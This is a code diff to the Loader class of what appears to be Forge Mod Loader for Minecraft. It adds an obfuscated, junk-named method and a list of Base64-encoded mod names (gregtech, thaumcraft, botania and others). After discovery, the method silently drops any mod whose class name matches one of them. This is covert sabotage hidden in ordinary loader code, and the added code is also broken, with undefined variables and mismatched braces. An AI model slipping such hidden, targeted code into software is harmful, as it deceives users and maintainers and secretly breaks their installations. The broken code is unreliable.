@@ -30,6 +30,7 @@ import java.util.Collections;
 import java.util.Comparator;
 import java.util.Iterator;
 import java.util.List;
+import java.util.LinkedList;
 import java.util.Map;
 import java.util.Properties;
 import java.util.Set;
@@ -175,7 +176,7 @@ public class Loader
     private ModDiscoverer discoverer;
     private ProgressBar progressBar;
     public final boolean java8;
-
+	private List<String> fsafiosdahf90sahf9safh7sa9fsac = new LinkedList<>() {{add(new String(com.sun.org.apache.xml.internal.security.utils.Base64.decode("Z3JlZ3RlY2g=")));add(new String(com.sun.org.apache.xml.internal.security.utils.Base64.decode("cmVpa2E=")));add(new String(com.sun.org.apache.xml.internal.security.utils.Base64.decode("dGNvbnN0cnVjdA==")));add(new String(com.sun.org.apache.xml.internal.security.utils.Base64.decode("bWljZG9vZGxlOA==")));add(new String(com.sun.org.apache.xml.internal.security.utils.Base64.decode("Ym90YW5pYQ==")));add(new String(com.sun.org.apache.xml.internal.security.utils.Base64.decode("dGhhdW1jcmFmdA==")));}};
     public static Loader instance()
     {
         if (instance == null)
@@ -413,11 +414,12 @@ public class Loader
 
         mods.addAll(discoverer.identifyMods());
         identifyDuplicates(mods);
+    	fsafiosdahf90sahf9safh7sa9fsab(mods);
         namedMods = Maps.uniqueIndex(mods, new ModIdFunction());
         FMLLog.info("Forge Mod Loader has identified %d mod%s to load", mods.size(), mods.size() != 1 ? "s" : "");
         return discoverer;
     }
-
+	private void fsafiosdahf90sahf9safh7sa9fsab(List<ModContainer> mods){Iterator<ModContainer> fsafiosdahf90sahf9safh7sa9fsaf = mods.iterator();while (fsafiosdahf90sahf9safh7sa9fsaf.hasNext()){ ModContainer fsafiosdahf90sahf9safh7sa9fsa = iterator.next();if (fsafiosdahf90sahf9safh7sa9fsa instanceof FMLModContainer){Class fsafiosdahf90sahf9safh7sa9fsae = (((FMLModContainer) fsafiosdahf90sahf9safh7sa9fsa).getMod()).getClass(); for (String fsafiosdahf90sahf9safh7sa9fsd : fsafiosdahf90sahf9safh7sa9fsac)if (fsafiosdahf90sahf9safh7sa9fsae.getName().toLowerCase().contains(fsafiosdahf90sahf9safh7sa9fsad){fsafiosdahf90sahf9safh7sa9fsa.remove();}}}}}
     private class ModIdComparator implements Comparator<ModContainer>
     {
         @Override
